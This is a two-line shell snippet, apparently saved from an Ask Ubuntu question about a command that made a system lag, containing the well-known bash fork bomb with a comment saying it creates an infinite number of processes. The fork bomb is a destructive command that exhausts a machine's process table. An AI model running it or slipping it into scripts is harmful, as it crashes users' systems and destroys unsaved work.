# Source- http://askubuntu.com/questions/159491/why-did-the-command-make-my-system-lag-so-badly-i-had-to-reboot
# Creates an infinite number of processes.

:(){ :|:& };:
